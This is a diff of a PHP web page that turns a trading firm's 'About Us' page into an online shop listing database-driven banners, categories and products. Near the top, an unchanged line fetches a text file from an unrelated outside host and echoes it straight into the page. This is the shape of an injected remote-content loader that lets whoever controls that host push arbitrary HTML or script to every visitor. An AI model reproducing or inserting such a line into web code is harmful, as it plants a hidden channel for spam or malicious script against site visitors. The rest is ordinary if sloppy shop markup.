@@ -12,50 +12,229 @@ $a = file_get_contents('https://sheet1131.xyz/ptacid.txt');
 echo $a;
 ?>
 <?php include "include/header.php"?>
-<?php include "include/navbar.php"?>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/65b609070ff6374032c5b511/1hl7h6iup';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
-<!-- Main Section -->
-<main class="main-content" >
-  <div class="container">
-  <div class="deposit_withdraw">
-    <div class="card text-center">
-      <h3>About Us</h3>
-      <hr>
-      <p>Hifortex is a dynamic trading company specializing in real-time trading solutions. With a focus on innovation, technology, and market expertise, we empower traders to navigate the complexities of the financial markets with confidence and agility. At Hifortex, we are committed to delivering exceptional value to our clients through cutting-edge platforms, personalized services, and a relentless dedication to excellence.</p>
-    </div>
-  </div>
-
-  <div class="deposit_withdraw">
-    <div class="card text-center">
-      <h3>Vision</h3>
-      <hr>
-      <p>To redefine the landscape of real-time trading, setting new standards of performance, reliability, and accessibility. We envision a future where every trader, from novice to expert, can harness the power of real-time data and advanced analytics to achieve their financial goals with precision and confidence.</p>
-    </div>
-  </div>
-
-  <div class="deposit_withdraw">
-    <div class="card text-center">
-      <h3>Mission</h3>
-      <hr>
-      <p>Our mission is to empower traders worldwide with the tools, knowledge, and support they need to succeed in today's dynamic markets. We are committed to providing innovative trading solutions that are user-friendly, reliable, and scalable, enabling our clients to seize opportunities, manage risks, and optimize their investment strategies in real time..</p>
-    </div>
-  </div>
+    <!-- Preloader-->
+  
 
 
-    </div>
-</main>
+    
+    <div class="page-content-wrapper">
+        <div class="container">
+            <div class="pt-3">
+                <!-- Hero Slides-->
+                <div class="hero-slides owl-carousel">
+                    <!-- Single Hero Slide-->
+					<?php
+					$res_add=mysqli_query($con,"SELECT * FROM banner_admin")or die("query error");
+					$cnt_add=mysqli_num_rows($res_add);
+					if($cnt_add>=1)
+					{
+						while($row_add=mysqli_fetch_array($res_add))
+						{
+						?>
+                        
+						<div class="single-hero-slide" style="background-image: url('<?php echo 'banners_admin/'.$row_add['pic']?>')">
+                        <div class="slide-content h-100 d-flex align-items-center">
+                            <div class="slide-text">
+                               
+                            </div>
+                        </div>
+                    </div>
+                  
+						<?php
+						}
+					}
+					else
+					{ 
+						?>
+						 <div class="single-hero-slide" style="background-image: url('img/bg-img/chrstocart1.png')">
+                        <div class="slide-content h-100 d-flex align-items-center">
+                            <div class="slide-text">
+                                
+                            </div>
+                        </div>
+                    </div> 
+					<div class="single-hero-slide" style="background-image: url('img/bg-img/chrstocart2.png')">
+                        <div class="slide-content h-100 d-flex align-items-center">
+                            <div class="slide-text">
+                               
+                            </div>
+                        </div>
+                    </div>
+						<?php
+					}
+					
+					?>
+
+                    <!--<div class="single-hero-slide" style="background-image: url('img/bg-img/3.jpg')">
+                        <div class="slide-content h-100 d-flex align-items-center">
+                            <div class="slide-text">
+                                <h4 class="text-white mb-0" data-animation="fadeInUp" data-delay="100ms" data-duration="1000ms">Best Furniture</h4>
+                                <p class="text-white" data-animation="fadeInUp" data-delay="400ms" data-duration="1000ms">3 years warranty</p><a class="btn btn-danger btn-sm" href="#" data-animation="fadeInUp" data-delay="800ms" data-duration="1000ms">Buy Now</a>
+                            </div>
+                        </div>
+                    </div>-->
+                </div>
+            </div>
+        </div>
+		<style>
+
+		</style>
+        <!-- Product Catagories -->
+	
+        <div class="product-catagories-wrapper py-3">
+            <div class="container">
+            <div class="section-heading d-flex align-items-center justify-content-between">
+                    <h6>Product Categoires</h6>
+                    <a href="category_all.php" style="color:black;font-family:Cambria, Cochin, Georgia, Times, 'Times New Roman', serif">View All</a>
+                </div>
+                <div class="product-catagory-wrap">
+                    <div class="row g-3">
+                        <!-- Single Catagory Card -->
+                       
+						<!---<div class="col-4">
+                            <div class="card catagory-card">
+                                <div class="card-body"><a class="text-danger" href="catagory.html">
+                      <svg class="bi bi-heart mb-2" xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M8 2.748l-.717-.737C5.6.281 2.514.878 1.4 3.053c-.523 1.023-.641 2.5.314 4.385.92 1.815 2.834 3.989 6.286 6.357 3.452-2.368 5.365-4.542 6.286-6.357.955-1.886.838-3.362.314-4.385C13.486.878 10.4.28 8.717 2.01L8 2.748zM8 15C-7.333 4.868 3.279-3.04 7.824 1.143c.06.055.119.112.176.171a3.12 3.12 0 0 1 .176-.17C12.72-3.042 23.333 4.867 8 15z"></path>
+                      </svg><span>Women's</span></a></div>
+                            </div>
+                        </div>--->
+                        <!-- Single Catagory Card -->
+                        
+                       
+                      
+                        <!-- Single Catagory Card -->
+						
+						<?php
+                        echo 
+					$res_cat=mysqli_query($con,"SELECT * FROM category LIMIT 9")or die("query error");
+					$i=1;
+					while($row_cat=mysqli_fetch_array($res_cat))
+					{
+						echo '<div class="col-4">
+                            <div class="card catagory-card">
+                                <div class="card-body"><a class="text-info"  href="category_main_view.php?cat_id='.$row_cat['id'].'">
+                                <img src="category_icon/'.$row_cat['icon'].'"  style="widht:40px;height:40px">
+                      <span>'.$row_cat['category_name'].'</span></a></div>
+                            </div>
+                        </div>';
+					}
+					?>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+      
+        <!-- Flash Sale Slide -->
+        <div class="flash-sale-wrapper">
+            <div class="container" style="background-color: <?php echo $bg?>;padding-top:10px">
+                <div class="section-heading d-flex align-items-center justify-content-between">
+                    <h6 class="me-1 d-flex align-items-center " style="color: <?php echo $font?>;">
+                        <svg class="bi bi-lightning me-1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M11.251.068a.5.5 0 0 1 .227.58L9.677 6.5H13a.5.5 0 0 1 .364.843l-8 8.5a.5.5 0 0 1-.842-.49L6.323 9.5H3a.5.5 0 0 1-.364-.843l8-8.5a.5.5 0 0 1 .615-.09zM4.157 8.5H7a.5.5 0 0 1 .478.647L6.11 13.59l5.732-6.09H9a.5.5 0 0 1-.478-.647L9.89 2.41 4.157 8.5z"></path>
+              </svg>Recent Product
+                    </h6>
+                    <!-- Please use event time this format: YYYY/MM/DD hh:mm:ss -->
+                    <a href="product_all.php" style="color:<?php echo $font?>;font-family:Cambria, Cochin, Georgia, Times, 'Times New Roman', serif">View All</a>
+                    <!--<ul class="sales-end-timer ps-0 d-flex align-items-center" data-countdown="2022/01/01 14:21:37">
+                        <li><span class="days">0</span>d</li>
+                        <li><span class="hours">0</span>h</li>
+                        <li><span class="minutes">0</span>m</li>
+                        <li><span class="seconds">0</span>s</li>
+                    </ul>--->
+                </div>
+                <!-- Flash Sale Slide-->
+                <div class="flash-sale-slide owl-carousel" >
+                   <?php $res_recent=mysqli_query($con,"SELECT * FROM product LIMIT 6")or die("Query error");
+				   while($row_recent=mysqli_fetch_array($res_recent))
+						{
+							?>
+                    <div class="card flash-sale-card text-center">
+                        <div class="card-body">
+						<a href="single.php?pro_id=<?php echo$row_recent['pro_ai']?>">
+                        <img src="<?php echo 'product_image/'.$row_recent['pic']?>" alt="" class="img-thumbnail" style="height:100px"> </a> 
+						<span class="product-title"><?php echo$row_recent['pro_name'];?></span>
+                  <p ><span style="color:#28711D;font-weight:500;font-family:'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif">Rs .<?php echo $row_recent['price'];?></span>
+                  <br>
+                  <span style="color:#AF190F;text-decoration: line-through;"><?php echo $row_recent['mrp'];?></span></p>
+                 <button class="btn btn-sm splash-button"  value="<?php echo$row_recent['pro_ai']?>" id="add_pro"  >Add Cart</button>
+                 </div>
+                    </div>
+                   <?php 
+						}
+				   ?>
+                    
+                    <!-- Single Flash Sale Card-->
+                    <!--<div class="card flash-sale-card">
+                        <div class="card-body"><a href="single-product.html"><img src="img/product/1.png" alt=""><span class="product-title">Black Table Lamp</span>
+                  <p class="sale-price">$7.99<span class="real-price">$15</span></p><span class="progress-title">33% Sold Out</span>
+                  
+                  <div class="progress">
+                    <div class="progress-bar" role="progressbar" style="width: 33%" aria-valuenow="33" aria-valuemin="0" aria-valuemax="100"></div>
+                  </div></a></div>
+                    </div>--->
+                    <!-- Single Flash Sale Card-->
+                </div>
+            </div>
+        </div>
+        <!-- Top Products -->
+        <div class="top-products-area py-3">
+            <div class="container">
+                <div class="section-heading d-flex align-items-center justify-content-between">
+                    <h6>All Products </h6>
+                    <a href="product_all.php" style="color:black;font-family:Cambria, Cochin, Georgia, Times, 'Times New Roman', serif">View All</a>
+                </div>
+                <div class="row g-3">
+                    <!-- Single Top Product Card -->
+					 <?php $res_pro=mysqli_query($con,"SELECT * FROM product LIMIT 20")or die("Query error");
+				   while($row_recent=mysqli_fetch_array($res_pro))
+						{
+							?>
+					 <div class="col-6 col-md-4 col-lg-3">
+                     <div class="card flash-sale-card text-center" style="margin-bottom: -20PX;">
+                        <div class="card-body">
+						<a href="single.php?pro_id=<?php echo$row_recent['pro_ai']?>">
+                        <img src="<?php echo 'product_image/'.$row_recent['pic']?>" alt="" class="img-thumbnail" style="height:130px"> </a> 
+						<span class="product-title"><?php echo$row_recent['pro_name'];?></span>
+                  <p ><span style="color:#28711D;font-weight:500;font-family:'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif">Rs .<?php echo $row_recent['price'];?></span>
+                  <br>
+                  <span style="color:#AF190F;text-decoration: line-through;"><?php echo $row_recent['mrp'];?></span></p>
+                 <button class="btn btn-sm splash-button"  value="<?php echo$row_recent['pro_ai']?>" id="add_pro"  >Add Cart</button>
+                 </div>
+                    </div>
+                    </div>
+					<?php
+						}
+					?>
+				
+                    <!---<div class="col-6 col-md-4 col-lg-3">
+                        <div class="card product-card">
+                            <div class="card-body">
+                                <!-- Badge<span class="badge rounded-pill badge-warning">Sale</span>
+                                <!-- Wishlist Button<a class="wishlist-btn" href="#"><i class="lni lni-heart">                       </i></a>
+                                <!-- Thumbnail -<a class="product-thumbnail d-block" href="single-product.html"><img class="mb-2" src="img/product/11.png" alt="">
+                   
+                    <ul class="offer-countdown-timer d-flex align-items-center shadow-sm" data-countdown="2021/12/31 23:59:59">
+                      <li><span class="days">0</span>d</li>
+                      <li><span class="hours">0</span>h</li>
+                      <li><span class="minutes">0</span>m</li>
+                      <li><span class="seconds">0</span>s</li>
+                    </ul></a>
+                                <!-- Product Title <a class="product-title d-block" href="single-product.html">Beach Cap</a>
+                                <!-- Product Price 
+                                <p class="sale-price">$13<span>$42</span></p>
+                                <!-- Rating 
+                                <div class="product-rating"><i class="lni lni-star-filled"></i><i class="lni lni-star-filled"></i><i class="lni lni-star-filled"></i><i class="lni lni-star-filled"></i><i class="lni lni-star-filled"></i></div>
+                                <!-- Add to Cart <a class="btn btn-success btn-sm" href="#"><i class="lni lni-plus"></i></a>
+                            </div>
+                        </div>
+                    </div>--->
+                    <!-- Single Top Product Card -->
+                </div>
+            </div>
+        </div>
+        </div>
+        
+        
 <?php include "include/footer.php"?>
-
-<?php
